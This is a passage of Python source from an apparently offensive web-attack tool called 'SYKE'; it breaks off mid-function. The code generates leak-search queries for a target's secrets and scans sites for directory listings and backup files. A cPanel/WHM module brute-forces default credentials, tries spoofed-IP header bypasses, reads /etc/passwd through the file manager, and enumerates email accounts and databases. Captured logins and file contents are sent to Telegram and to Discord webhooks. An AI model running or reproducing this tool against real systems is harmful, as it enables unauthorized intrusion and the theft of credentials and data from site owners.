        f"https://github.com/search?q={root}+DB_PASSWORD&type=code",
        f"https://github.com/search?q={root}+DATABASE_URL&type=code",
        f"https://github.com/search?q={root}+AWS_SECRET_ACCESS_KEY&type=code",
        f"https://github.com/search?q={root}+STRIPE_SECRET_KEY&type=code",
        f"https://github.com/search?q={root}+private_key&type=code",
        f"https://github.com/search?q={root}+\.env&type=code",
        f"https://github.com/search?q={root}+wp-config&type=code",
        f"https://gist.github.com/search?q={root}+password",
        f"https://gist.github.com/search?q={root}+api_key",
        f"https://gitlab.com/search?search={root}+password&scope=blobs",
        f"https://gitlab.com/search?search={root}+api_key&scope=blobs",
        f"https://pastebin.com/search?q={root}",
        f"https://pastebin.com/search?q={root}+password",
        f"https://pastebin.com/search?q={root}+api",
        f"https://pastehunter.com/?query={root}",
        f"https://psbdmp.ws/search/{root}",
        f"https://www.peekyou.com/?search={root}",
        f"https://hunter.io/search/{root}",
        f"https://haveibeenpwned.com/DomainSearch",
        f"https://dehashed.com/search?query={root}",
        f"https://intelx.io/?s={root}",
        f"https://www.google.com/search?q=inurl%3Apastebin.com+{root}",
        f"https://www.google.com/search?q=inurl%3Agithub.com+{root}+password",
        f"https://trufflehog.io/?q={root}",
        f"https://osint.sh/email/{root}",
        f"https://emailrep.io/{root}",
        f"https://leakcheck.io/api?key=free&check={root}",
    ]

    _result_box("LEAK SEARCH LINKS",[f"{CYN}{l[:90]}{RST}" for l in links])
    _pause()
    return links


                                                                                 
                         
                                                                                 

_discord_webhook_url = None


def set_discord_webhook(url):
    global _discord_webhook_url, DISCORD_HOOK
    _discord_webhook_url = url
    DISCORD_HOOK = url


def discord_notify(title, description, color=0x9B59B6, target=""):
    hook = _discord_webhook_url or DISCORD_HOOK
    if not hook:
        return False
    try:
        payload = {
            "embeds": [{
                "title":       title[:256],
                "description": description[:4096],
                "color":       color,
                "footer":      {"text": f"SYKE | target: {target[:100]}"},
                "timestamp":   datetime.datetime.utcnow().isoformat(),
            }]
        }
        r = requests.post(hook, json=payload, timeout=10)
        return r.ok
    except Exception:
        return False


def discord_menu():
    _banner()
    _menu_box("DISCORD WEBHOOK",[
        "[1] Set webhook URL",
        "[2] Test webhook",
        "[3] Send current findings",
        "[00] Back",
    ])
    ch = _ask("discord-option").strip()
    if ch == "1":
        wh = _ask("webhook URL").strip()
        if wh:
            set_discord_webhook(wh)
            _clean(f"Discord webhook set")
        _pause()
    elif ch == "2":
        if not _discord_webhook_url:
            _err("No webhook set")
            _pause()
            return
        ok = discord_notify(
            "SYKE — Test",
            "Webhook is working!",
            0x9B59B6,
        )
        _clean("Sent!") if ok else _err("Failed to send")
        _pause()
    elif ch == "3":
        if not _discord_webhook_url:
            _err("Set webhook first")
            _pause()
            return
        summary = (
            f"**SYKE Scan Report**\n"
            f"User: {CURRENT_USER or 'anon'}\n"
            f"CRITICAL: {STATS['crit']}  HIGH: {STATS['hi']}  "
            f"MED: {STATS['med']}  LOW: {STATS['lo']}\n"
            f"Total findings: {STATS['total']}\n"
            f"Compromised: {len(PWNED_LIST)}"
        )
        ok = discord_notify("SYKE Report", summary, 0x9B59B6)
        _clean("Sent!") if ok else _err("Failed to send")
        _pause()


                                                                                 
                          
                                                                                 

def dir_listing_check(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Directory Listing Check → {base}")
    results = []
    listing_sigs = [
        "index of /", "index of \\", "directory listing",
        "<h1>index of", "parent directory",
        "last modified", "[dir]", "[txt]", "[pdf]",
        "apache/", "nginx/", "iis/",
        "parent directory</a>", "up to higher level directory",
        "..to parent directory", "webdav", "httpindex",
    ]
    dirs_to_check = [
        "/", "/uploads/", "/upload/", "/files/", "/file/",
        "/media/", "/images/", "/img/", "/photos/",
        "/documents/", "/docs/", "/downloads/",
        "/backup/", "/backups/", "/old/", "/archive/",
        "/static/", "/assets/", "/css/", "/js/", "/lib/",
        "/vendor/", "/node_modules/",
        "/wp-content/uploads/", "/wp-content/plugins/",
        "/wp-content/themes/", "/wp-includes/",
        "/wp-content/backups/",
        "/storage/", "/logs/", "/log/", "/tmp/", "/temp/",
        "/data/", "/db/", "/sql/", "/config/",
        "/scripts/", "/bin/", "/cgi-bin/",
        "/test/", "/tests/", "/dev/", "/debug/",
        "/private/", "/secret/", "/hidden/",
        "/public/", "/public_html/", "/htdocs/",
        "/web/", "/webroot/", "/www/",
        "/admin/", "/admin/uploads/",
    ]

    for path in dirs_to_check:
        full = base + path
        try:
            r = _get(full, timeout=TIMEOUT)
            if not r or r.status_code != 200:
                continue
            body_low = r.text.lower()
            if any(sig in body_low for sig in listing_sigs):
                _vuln(f"Directory listing: {full}")
                _colored_hit(full, r.status_code, len(r.content), "LISTING")
                results.append({
                    "path":   full,
                    "status": r.status_code,
                    "size":   len(r.content),
                })
                _add_finding(
                    "HIGH","Directory Listing Enabled",full,
                    "Server exposes directory contents",
                    f"Path: {full}",
                    "Disable directory listings in server config (Options -Indexes).",
                    "Misconfiguration"
                )
        except Exception:
            pass
        _jitter()

    if results:
        detail = "\n".join(r["path"] for r in results[:10])
        _found_box("DIR LISTING", base, detail, found=True)
    else:
        _clean("No directory listings found")
        _found_box("DIR LISTING", base, "No listings exposed", found=False)

    _result_box("DIRECTORY LISTING",[
        f"{RED}[LISTING]{RST} {r['path']}"
        for r in results[:20]
    ] or [f"{GRN}No directory listings{RST}"])
    _pause()
    return results


                                                                                 
                                                  
                                                                                 

def backup_scanner_full(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Backup File Scanner → {base}")
    results = []
    all_backup = list(dict.fromkeys(
        BACKUP_PATHS_EXTRA + EXTENDED_BACKUP_PATHS_2
    ))

    def _chk_backup(path):
        full = base + path
        try:
            r = _get(full, timeout=TIMEOUT)
            if not r:
                return
            code = r.status_code
            if code in (200, 403, 401):
                size = len(r.content)
                _colored_hit(full, code, size)
                if code == 200 and size > 50:
                    for pat, label in SECRET_PATTERNS:
                        if pat.search(r.text):
                            _vuln(f"Backup has secrets [{label}]: {path}")
                            _add_finding(
                                "CRITICAL",f"Backup File with Secrets — {label}",full,
                                f"Backup file {path} contains {label}",
                                f"Pattern: {label}",
                                "Remove backup files from web root. Restrict access.",
                                "Backup Exposure"
                            )
                            break
                    results.append({
                        "path":   full,
                        "status": code,
                        "size":   size,
                    })
                    _add_finding(
                        "HIGH","Backup File Exposed",full,
                        f"Backup file accessible: {path}",
                        f"Status: {code}  Size: {size}",
                        "Remove backup files from web root.",
                        "Backup Exposure"
                    )
                elif code in (403, 401):
                    results.append({
                        "path":   full,
                        "status": code,
                        "size":   size,
                        "note":   "protected",
                    })
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=min(THREADS, 25)) as pool:
        pool.map(_chk_backup, all_backup)

    accessible = [r for r in results if r["status"] == 200]
    protected  = [r for r in results if r["status"] in (401, 403)]

    if accessible:
        detail = "\n".join(r["path"] for r in accessible[:10])
        _found_box("BACKUP FILES", base, detail, found=True)
        _tg_send_result("BACKUP EXPOSED", base, detail, CURRENT_USER)
    elif protected:
        _warn(f"Protected backups found: {len(protected)}")
        _found_box("BACKUP FILES (PROTECTED)", base,
                   "\n".join(r["path"] for r in protected[:5]), found=True)
    else:
        _clean("No backup files found")
        _found_box("BACKUP FILES", base, "No backups found", found=False)

    _result_box("BACKUP SCANNER",[
        f"{_status_color(r['status'])}[{r['status']}]{RST}"
        f" {r['path'][:60]}"
        + (f"  {DIM}{r['size']}b{RST}" if 'size' in r else "")
        for r in results[:25]
    ] or [f"{GRN}No backup files found{RST}"])
    _pause()
    return results


                                                                                 
                              
                                                                                 

def batch_scan_from_file(filepath=None, scan_type="full"):
    _banner()
    if not filepath:
        filepath = _ask("targets file path").strip()
    if not filepath or not os.path.exists(filepath):
        _err(f"File not found: {filepath}")
        _pause()
        return []

    with open(filepath, "r", errors="ignore") as fh:
        targets = [l.strip() for l in fh if l.strip() and not l.startswith("#")]

    _info(f"Batch scan: {len(targets)} targets  mode={scan_type}")
    results = []
    for idx, target in enumerate(targets):
        _info(f"[{idx+1}/{len(targets)}] {target}")
        try:
            ok, url, r = url_precheck(target, verbose=False)
            if not ok:
                _warn(f"Unreachable: {target}")
                continue
            code = r.status_code if r else 0
            col  = _status_color(code)
            print(f"  {col}[{code}]{RST} {url}")
            if scan_type == "full":
                full_scan(target)
            elif scan_type == "admin":
                admin_finder(target)
            elif scan_type == "backup":
                backup_scanner_full(target)
            elif scan_type == "fingerprint":
                fingerprint(target)
            elif scan_type == "env":
                env_file_check(target)
            elif scan_type == "git":
                git_dump_check(target)
            elif scan_type == "dirs":
                dir_listing_check(target)
            elif scan_type == "sqli":
                sqli_scan(target)
            results.append({"target": target, "status": code})
        except KeyboardInterrupt:
            _warn("Batch scan interrupted by user")
            break
        except Exception as e:
            _err(f"Error on {target}: {e}")
        time.sleep(DELAY if DELAY > 0 else 0.5)

    _result_box(f"BATCH SCAN — {scan_type.upper()}",[
        f"{_status_color(r['status'])}[{r['status']}]{RST} {r['target']}"
        for r in results[:30]
    ])
    _export_results_formats()
    _pause()
    return results


                                                                                 
                                
                                                                                 

def save_checkpoint(target, module, completed_paths, results_so_far):
    try:
        data = {
            "target":          target,
            "module":          module,
            "completed_paths": completed_paths,
            "results":         results_so_far,
            "timestamp":       datetime.datetime.utcnow().isoformat(),
            "user":            CURRENT_USER or "anon",
        }
        with open(RESUME_FILE, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
    except Exception:
        pass


def load_checkpoint():
    if not os.path.exists(RESUME_FILE):
        return None
    try:
        with open(RESUME_FILE, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except Exception:
        return None


def clear_checkpoint():
    try:
        os.remove(RESUME_FILE)
    except Exception:
        pass


def resume_scan():
    _banner()
    cp = load_checkpoint()
    if not cp:
        _warn("No checkpoint found")
        _pause()
        return
    _info(f"Checkpoint found:")
    _info(f"  Target:    {cp.get('target','?')}")
    _info(f"  Module:    {cp.get('module','?')}")
    _info(f"  Completed: {len(cp.get('completed_paths',[]))} paths")
    _info(f"  Results:   {len(cp.get('results',[]))} findings")
    _info(f"  Time:      {cp.get('timestamp','?')}")
    print()
    choice = _ask("resume this scan? [y/n]").strip().lower()
    if choice != "y":
        choice2 = _ask("delete checkpoint? [y/n]").strip().lower()
        if choice2 == "y":
            clear_checkpoint()
            _clean("Checkpoint deleted")
        _pause()
        return
    target = cp.get("target")
    module = cp.get("module","full")
    if module == "full":
        full_scan(target)
    elif module == "admin":
        admin_finder(target)
    elif module == "backup":
        backup_scanner_full(target)
    elif module == "env":
        env_file_check(target)
    elif module == "git":
        git_dump_check(target)
    else:
        full_scan(target)
    clear_checkpoint()
    _pause()


                                                                                 
                             
                                                                                 

# pystyle Colors removed — pure ANSI blue used throughout; C1/C2/C3/C4
# are kept as placeholders so any residual references don't crash.
GALAXY_COLOR_SETS = [
    ("blue", "blue"),
    ("blue", "blue"),
    ("blue", "blue"),
    ("blue", "blue"),
]


def _banner():
    global C1, C2, C3, C4
    pair    = random.choice(GALAXY_COLOR_SETS)
    C1, C2  = pair
    C3, C4  = pair[1], pair[0]
    os.system("cls" if os.name == "nt" else "clear")
    try:
        term_w = os.get_terminal_size().columns
    except Exception:
        term_w = 100
    lines = BANNER_TEXT.split("\n")
    max_len = max((len(l.rstrip()) for l in lines if l.strip()), default=0)
    left_pad = max(0, (term_w - max_len) // 2)
    for line in lines:
        print(BLU + " " * left_pad + line.rstrip() + RST)
    credit = "Coded by risu"
    pad = max(0, (term_w - len(credit)) // 2)
    print(BLU + " " * pad + credit + RST)
    print()
    if CURRENT_USER:
        info = f"  logged in: {CURRENT_USER}   tg: {TG_RESULT_GROUP}"
        print(BLU + info + RST + "\n")


def show_banner():
    _banner()


                                                                                 
                                
                                                                                 

def extras_menu(target=None):
    while True:
        _banner()
        if target:
            print(f"{BLU}\n  target: {target}\n{RST}")
        _menu_box_split("EXTRAS & NEW MODULES",[
            "[01]  Target Info Display",
            "[02]  URL Pre-Check",
            "[03]  HTTP Method Probe",
            "[04]  CORS Full Audit",
            "[05]  Clickjacking Check",
            "[06]  Open Redirect Scan",
            "[07]  crt.sh Subdomain Enum",
            "[08]  Password Spray",
            "[09]  Login Form Detect",
            "[10]  Cookie Entropy Check",
            "[11]  JWT Weak Secret Brute",
            "[12]  Git Source Dump",
            "[13]  Env File Check",
            "[14]  HTML Comment Scan",
            "[15]  WP Plugin Version Enum",
            "[16]  WP User Author Enum",
            "[17]  Directory Listing Check",
            "[18]  Backup File Scanner",
            "[19]  Shodan / OSINT Dorks",
            "[20]  Google Dork Generator",
            "[21]  Leak Search Generator",
            "[22]  Discord Webhook Manager",
            "[23]  Proxy Manager",
            "[24]  Batch Scan from File",
            "[25]  Resume Interrupted Scan",
            "[00]  Back",
        ], divider_after={12})
        ch  = _ask("extras-option").strip()
        url = (target or
               (_ask("target-url").strip() if ch not in ("0","","25","22","23","24") else ""))
        if not url and ch not in ("0","","11","19","20","21","22","23","24","25"):
            continue
        if   ch == "1":  show_target_info_fn(url)
        elif ch == "2":
            _banner()
            ok, u, r = url_precheck(url or _ask("target-url").strip())
            _pause()
        elif ch == "3":  http_methods_probe(url)
        elif ch == "4":  cors_full_check(url)
        elif ch == "5":  clickjacking_check(url)
        elif ch == "6":  open_redirect_full_scan(url)
        elif ch == "7":  crtsh_enum_fn(url)
        elif ch == "8":  smart_password_spray(url)
        elif ch == "9":  login_form_scan(url)
        elif ch == "10": cookie_entropy_check(url)
        elif ch == "11": jwt_weak_brute(url or None)
        elif ch == "12": git_dump_check(url)
        elif ch == "13": env_file_check(url)
        elif ch == "14": html_comment_scan(url)
        elif ch == "15": wp_plugin_readme_enum(url)
        elif ch == "16": wp_user_author_enum(url)
        elif ch == "17": dir_listing_check(url)
        elif ch == "18": backup_scanner_full(url)
        elif ch == "19": shodan_dork_gen(url)
        elif ch == "20": google_dork_gen(url)
        elif ch == "21": leak_search_gen(url)
        elif ch == "22": discord_menu()
        elif ch == "23": proxy_menu()
        elif ch == "24": batch_scan_from_file()
        elif ch == "25": resume_scan()
        elif ch in ("0",""): break
        else: time.sleep(0.3)


                                                                                 
            
                                                                                 

CPANEL_PATHS = [
    ":2082", ":2083", ":2086", ":2087",
    "/cpanel", "/cpanel/", "/whm", "/whm/",
    "/webmail", "/webmail/", "/webmail/cpanel",
    ":2095", ":2096",
    "/cPanel_magic_revision_0/",
    "/frontend/paper_lantern/",
]

CPANEL_DEFAULT_CREDS = [
    ("admin","admin"), ("admin","123456"), ("admin","password"),
    ("root","root"), ("root","toor"), ("root","admin"),
    ("cpanel","cpanel"), ("cpanel","123456"),
    ("administrator","administrator"), ("administrator","admin"),
    ("test","test"), ("demo","demo"), ("user","user"),
    ("admin","admin123"), ("admin","pass"), ("admin","1234"),
    ("admin","qwerty"), ("admin","letmein"), ("admin","welcome"),
]

CPANEL_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
]

CPANEL_API_ENDPOINTS = [
    "/json-api/cpanel",
    "/json-api/listaccts",
    "/json-api/whostmgrd",
    "/execute/Fileman/list_files",
    "/execute/Email/list_pops",
    "/execute/Mysql/list_databases",
    "/execute/SubDomain/listsubdomains",
    "/execute/Backup/fullbackup_to_homedir",
    "/xml-api/listaccts",
    "/xml-api/cpanel",
    "/cpsess0000000000/execute/Fileman/list_files",
]

def _cpanel_port_scan(host):
    ports = [2082, 2083, 2086, 2087, 2095, 2096, 80, 443, 8080, 8443]
    open_ports = []
    _info(f"cPanel Port Scan → {host}")
    total = len(ports)
    for i, port in enumerate(ports):
        _loading_bar(i + 1, total, f":{port}")
        try:
            s = socket.create_connection((host, port), timeout=3)
            s.close()
            open_ports.append(port)
            _found(f"OPEN  :{port}")
        except Exception:
            pass
    return open_ports

def _cpanel_login_check(base, user, pwd, sess):
    login_urls = [
        f"{base}:2082/login/",
        f"{base}:2083/login/",
        f"{base}/cpanel/",
        f"{base}/login/",
    ]
    for url in login_urls:
        try:
            r = sess.post(url, data={
                "user": user, "pass": pwd,
                "login_only": "1", "goto_uri": "/",
            }, timeout=TIMEOUT, verify=VERIFY_SSL, allow_redirects=True)
            if r and r.status_code in (200, 302):
                text = r.text.lower()
                if any(k in text for k in ["logout","cpsess","dashboard","home_dir","home dir"]):
                    return True, url
        except Exception:
            pass
    return False, None

def _cpanel_whm_check(base, user, pwd, sess):
    whm_urls = [
        f"{base}:2086/",
        f"{base}:2087/",
        f"{base}/whm/",
    ]
    for url in whm_urls:
        try:
            r = sess.post(url + "login/", data={
                "user": user, "pass": pwd,
            }, timeout=TIMEOUT, verify=VERIFY_SSL, allow_redirects=True)
            if r and r.status_code in (200, 302):
                text = r.text.lower()
                if any(k in text for k in ["logout","listaccts","whm","webhost"]):
                    return True, url
        except Exception:
            pass
    return False, None

def cpanel_brute(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    host   = parsed.hostname
    base   = f"{parsed.scheme}://{parsed.hostname}"
    sess   = _make_waf_session()
    hits   = []
    total  = len(CPANEL_DEFAULT_CREDS)
    _info(f"cPanel Brute-Force → {base}  ({total} credential pairs)")
    for i, (user, pwd) in enumerate(CPANEL_DEFAULT_CREDS):
        _loading_bar(i + 1, total, f"{user}:{pwd}")
        ok, hit_url = _cpanel_login_check(base, user, pwd, sess)
        if ok:
            _vuln(f"cPanel LOGIN: {user}:{pwd}  @ {hit_url}")
            hits.append({"url": hit_url, "user": user, "pass": pwd, "type": "cpanel"})
            _found_box("CPANEL BRUTE", hit_url, f"{user}:{pwd}", found=True)
            _tg_send_result("CPANEL BRUTE", hit_url, f"user={user} pass={pwd}", CURRENT_USER)
    if not hits:
        _clean("No default cPanel credentials worked")
    else:
        _result_box("CPANEL CREDENTIALS", [
            f"{GRN}[HIT]{RST}  {h['user']}:{h['pass']}  {DIM}{h['url']}{RST}"
            for h in hits
        ])
    _pause(); return hits

def cpanel_whm_brute(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.hostname}"
    sess   = _make_waf_session()
    hits   = []
    total  = len(CPANEL_DEFAULT_CREDS)
    _info(f"WHM Brute-Force → {base}  ({total} credential pairs)")
    for i, (user, pwd) in enumerate(CPANEL_DEFAULT_CREDS):
        _loading_bar(i + 1, total, f"{user}:{pwd}")
        ok, hit_url = _cpanel_whm_check(base, user, pwd, sess)
        if ok:
            _vuln(f"WHM LOGIN: {user}:{pwd}  @ {hit_url}")
            hits.append({"url": hit_url, "user": user, "pass": pwd, "type": "whm"})
            _found_box("WHM BRUTE", hit_url, f"{user}:{pwd}", found=True)
            _tg_send_result("WHM BRUTE", hit_url, f"user={user} pass={pwd}", CURRENT_USER)
    if not hits:
        _clean("No default WHM credentials worked")
    else:
        _result_box("WHM CREDENTIALS", [
            f"{GRN}[HIT]{RST}  {h['user']}:{h['pass']}  {DIM}{h['url']}{RST}"
            for h in hits
        ])
    _pause(); return hits

def cpanel_port_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    host   = parsed.hostname
    base   = f"{parsed.scheme}://{parsed.hostname}"
    open_ports = _cpanel_port_scan(host)
    accessible = []
    for port in open_ports:
        for path in ["/", "/login/", "/cpanel/"]:
            try:
                r = _get(f"http://{host}:{port}{path}", timeout=5)
                if r and r.status_code < 500:
                    note = ""
                    txt  = r.text.lower()
                    if "cpanel" in txt:   note = "[cPanel]"
                    elif "webmail" in txt: note = "[Webmail]"
                    elif "whm" in txt:    note = "[WHM]"
                    accessible.append((port, path, r.status_code, note))
                    _found(f":{port}{path}  [{r.status_code}] {note}")
                    break
            except Exception:
                pass
    if accessible:
        _result_box("CPANEL PORTS FOUND", [
            f"{GRN}:{p}{path}{RST}  [{code}] {note}"
            for p, path, code, note in accessible
        ])
        detail = "\n".join(f":{p}{path} [{c}]" for p, path, c, _ in accessible[:5])
        _found_box("CPANEL PORT SCAN", base, detail, found=True)
        _tg_send_result("CPANEL PORTS", base, detail, CURRENT_USER)
    else:
        _clean("No cPanel ports found/accessible")
    _pause(); return accessible

def cpanel_header_bypass(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.hostname}"
    hits   = []
    cpanel_login_paths = [
        f"{base}:2082/login/",
        f"{base}:2083/login/",
        f"{base}/cpanel/",
        f"{base}:2087/",
        f"{base}:2086/",
    ]
    total = len(CPANEL_BYPASS_HEADERS) * len(cpanel_login_paths)
    done  = 0
    _info(f"cPanel Header Bypass → {base}  ({total} probes)")
    for path in cpanel_login_paths:
        for hdrs in CPANEL_BYPASS_HEADERS:
            done += 1
            _loading_bar(done, total, list(hdrs.keys())[0])
            try:
                r = _get(path, headers=hdrs, allow_redirects=True)
                if r and r.status_code in (200, 302):
                    txt = r.text.lower()
                    if any(k in txt for k in ["cpanel","dashboard","logout","cpsess"]):
                        _vuln(f"Bypass via {hdrs}  → {path}  [{r.status_code}]")
                        hits.append({"header": str(hdrs), "url": path,
                                     "status": r.status_code})
                        _found_box("CPANEL HEADER BYPASS", path, str(hdrs), found=True)
                        _tg_send_result("CPANEL BYPASS", path, str(hdrs), CURRENT_USER)
            except Exception:
                pass
    if hits:
        _result_box("HEADER BYPASS HITS", [
            f"{RED}[BYPASS]{RST}  {h['header']}  {DIM}{h['url']}{RST}"
            for h in hits
        ])
    else:
        _clean("No header bypass worked")
    _pause(); return hits

def cpanel_api_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.hostname}"
    hits   = []
    total  = len(CPANEL_API_ENDPOINTS)
    _info(f"cPanel API Scan → {base}  ({total} endpoints)")
    for i, ep in enumerate(CPANEL_API_ENDPOINTS):
        _loading_bar(i + 1, total, ep)
        for port in [2082, 2083, 2086, 2087, 80, 443]:
            try:
                full = f"http://{parsed.hostname}:{port}{ep}"
                r    = _get(full, timeout=TIMEOUT)
                if r and r.status_code in (200, 401, 403):
                    _found(f"[{r.status_code}]  {full}")
                    hits.append({"url": full, "status": r.status_code,
                                 "size": len(r.content)})
                    if r.status_code == 200:
                        _vuln(f"API EXPOSED: {full}")
                        _found_box("CPANEL API", full,
                                   f"HTTP {r.status_code}  {len(r.content)}b",
                                   found=True)
                        _tg_send_result("CPANEL API", full,
                                        f"HTTP {r.status_code}", CURRENT_USER)
                    break
            except Exception:
                pass
    if hits:
        _result_box("CPANEL API ENDPOINTS", [
            f"{GRN if h['status']==200 else YLW}[{h['status']}]{RST}  {h['url']}"
            for h in hits
        ])
    else:
        _clean("No exposed cPanel API endpoints found")
    _pause(); return hits

def cpanel_path_finder(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    host   = parsed.hostname
    paths  = [
        f"http://{host}:2082/", f"http://{host}:2083/",
        f"http://{host}:2086/", f"http://{host}:2087/",
        f"http://{host}:2095/", f"http://{host}:2096/",
        f"http://{host}/cpanel", f"http://{host}/whm",
        f"http://{host}/webmail", f"http://{host}/cpanel/",
        f"https://{host}:2083/", f"https://{host}:2087/",
        f"https://{host}:2096/", f"https://{host}/cpanel/",
        f"http://{host}/cPanel_magic_revision_0/",
        f"http://{host}/frontend/paper_lantern/",
        f"http://{host}/frontend/x3/",
    ]
    hits  = []
    total = len(paths)
    _info(f"cPanel Path Finder → {host}  ({total} paths)")
    for i, p in enumerate(paths):
        _loading_bar(i + 1, total, p.split(host)[-1])
        try:
            r = _get(p, timeout=5, allow_redirects=True)
            if r and r.status_code in (200, 301, 302, 401, 403):
                txt  = r.text.lower()
                note = ""
                if "cpanel" in txt:   note = "cPanel"
                elif "whm" in txt:    note = "WHM"
                elif "webmail" in txt: note = "Webmail"
                else:                  note = f"HTTP {r.status_code}"
                _found(f"{p}  [{r.status_code}]  {note}")
                hits.append({"url": p, "status": r.status_code, "note": note})
                if r.status_code in (200, 301, 302):
                    _found_box("CPANEL PATH", p, note, found=True)
                    _tg_send_result("CPANEL PATH", p, note, CURRENT_USER)
        except Exception:
            pass
    if hits:
        _result_box("CPANEL PATHS", [
            f"{GRN}[{h['status']}]{RST}  {h['url']}  {DIM}{h['note']}{RST}"
            for h in hits
        ])
    else:
        _clean("No cPanel paths accessible")
    _pause(); return hits

def cpanel_version_detect(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return
    parsed = urlparse(url)
    host   = parsed.hostname
    _info(f"cPanel Version Detect → {host}")
    version_paths = [
        f"http://{host}:2082/", f"http://{host}:2083/",
        f"http://{host}:2086/", f"http://{host}:2087/",
        f"http://{host}/cpanel/",
    ]
    found_ver = []
    for p in version_paths:
        try:
            r = _get(p, timeout=5)
            if not r:
                continue
            ver = re.search(r'cPanel[/ ]+(\d+[\.\d]+)', r.text, re.I)
            srv = r.headers.get("Server", "")
            pwr = r.headers.get("X-Powered-By", "")
            if ver:
                _found(f"Version: {ver.group(1)}  @ {p}")
                found_ver.append(f"cPanel {ver.group(1)}")
            if "cpanel" in srv.lower():
                _found(f"Server: {srv}")
                found_ver.append(f"Server: {srv}")
            if pwr:
                _found(f"X-Powered-By: {pwr}")
        except Exception:
            pass
    if found_ver:
        _result_box("CPANEL VERSION", found_ver)
        _tg_send_result("CPANEL VERSION", host, "\n".join(found_ver), CURRENT_USER)
    else:
        _clean("Version not detected")
    _pause()

def cpanel_filemanager_check(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    host   = parsed.hostname
    fm_paths = [
        f"http://{host}:2082/execute/Fileman/list_files?dir=%2F",
        f"http://{host}:2083/execute/Fileman/list_files?dir=%2F",
        f"http://{host}:2082/frontend/paper_lantern/filemanager/index.html",
        f"http://{host}:2083/frontend/paper_lantern/filemanager/index.html",
        f"http://{host}:2082/execute/Fileman/get_file_content?dir=%2Fetc&file=passwd",
        f"http://{host}:2083/execute/Fileman/get_file_content?dir=%2Fetc&file=passwd",
    ]
    hits  = []
    total = len(fm_paths)
    _info(f"cPanel File Manager → {host}  ({total} paths)")
    for i, p in enumerate(fm_paths):
        _loading_bar(i + 1, total, p.split(host)[-1][:40])
        try:
            r = _get(p, timeout=TIMEOUT)
            if r and r.status_code == 200:
                txt = r.text.lower()
                if any(k in txt for k in ["files","directory","passwd","root:"]):
                    _vuln(f"File Manager exposed: {p}")
                    hits.append({"url": p, "status": r.status_code,
                                 "size": len(r.content)})
                    _found_box("CPANEL FILEMANAGER", p,
                               f"HTTP 200  {len(r.content)}b", found=True)
                    _tg_send_result("CPANEL FILEMANAGER", p,
                                    r.text[:300], CURRENT_USER)
        except Exception:
            pass
    if not hits:
        _clean("File Manager not exposed or requires auth")
    _pause(); return hits

def cpanel_email_enum(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    host   = parsed.hostname
    _info(f"cPanel Email Enum → {host}")
    email_paths = [
        f"http://{host}:2082/execute/Email/list_pops",
        f"http://{host}:2083/execute/Email/list_pops",
        f"http://{host}:2082/json-api/cpanel?cpanel_jsonapi_func=listpops&cpanel_jsonapi_module=Email",
        f"http://{host}:2083/json-api/cpanel?cpanel_jsonapi_func=listpops&cpanel_jsonapi_module=Email",
    ]
    hits = []
    for p in email_paths:
        try:
            r = _get(p, timeout=TIMEOUT)
            if r and r.status_code == 200:
                emails = re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+',
                                    r.text)
                if emails:
                    _found(f"Emails found: {emails[:10]}")
                    hits.extend(emails)
                    _found_box("CPANEL EMAILS", p,
                               "\n".join(emails[:10]), found=True)
                    _tg_send_result("CPANEL EMAILS", p,
                                    "\n".join(emails[:10]), CURRENT_USER)
        except Exception:
            pass
    if hits:
        _result_box("EMAIL ACCOUNTS", [f"{GRN}{e}{RST}" for e in set(hits)])
    else:
        _clean("No email accounts exposed")
    _pause(); return hits

def cpanel_db_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause(); return []
    parsed = urlparse(url)
    host   = parsed.hostname
    _info(f"cPanel DB Scan → {host}")
    db_paths = [
        f"http://{host}:2082/execute/Mysql/list_databases",
        f"http://{host}:2083/execute/Mysql/list_databases",
        f"http://{host}:2082/json-api/cpanel?cpanel_jsonapi_func=listdbs&cpanel_jsonapi_module=Mysql",
        f"http://{host}:2083/json-api/cpanel?cpanel_jsonapi_func=listdbs&cpanel_jsonapi_module=Mysql",
        f"http://{host}:2082/execute/PostgresQL/list_databases",
        f"http://{host}:2083/execute/PostgresQL/list_databases",
    ]
    hits = []
    for p in db_paths:
        try:
            r = _get(p, timeout=TIMEOUT)
            if r and r.status_code == 200:
                dbs = re.findall(r'"db"\s*:\s*"([^"]+)"', r.text)
                dbs += re.findall(r'<db>([^<]+)</db>', r.text)
                if dbs:
                    _found(f"Databases: {dbs[:10]}")
                    hits.extend(dbs)
                    _found_box("CPANEL DATABASES", p,
                               "\n".join(dbs[:10]), found=True)
                    _tg_send_result("CPANEL DATABASES", p,
